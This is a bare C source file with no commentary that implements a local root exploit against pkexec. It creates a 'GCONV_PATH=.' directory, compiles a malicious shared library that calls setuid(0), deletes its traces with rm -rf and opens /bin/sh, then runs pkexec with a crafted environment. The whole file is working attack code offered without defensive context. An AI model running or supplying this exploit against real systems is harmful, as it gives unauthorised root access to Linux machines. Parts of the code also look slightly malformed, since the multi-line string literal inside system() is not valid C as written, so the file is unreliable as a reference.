#include <stdlib.h>
#include <unistd.h>

int main() {
    system("
        mkdir -p 'GCONV_PATH=.'; \
        touch 'GCONV_PATH=./pwnkit'; \
        chmod a+x 'GCONV_PATH=./pwnkit'; \
        echo '#include <stdio.h>\n' \
            '#include <stdlib.h>\n' \
            '#include <unistd.h>\n\n' \
            'void gconv() {}\n' \
            'void gconv_init() {\n' \
            'setuid(0); setgid(0);\n' \
            'seteuid(0); setegid(0);\n' \
            'system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' pwnkit; /bin/sh\");\n' \
            'exit(0);\n' \
            '}' \
        | gcc -o pwnkit/lib.so -shared -fpic -xc -");

    char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "SHELL=x", NULL };
    execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
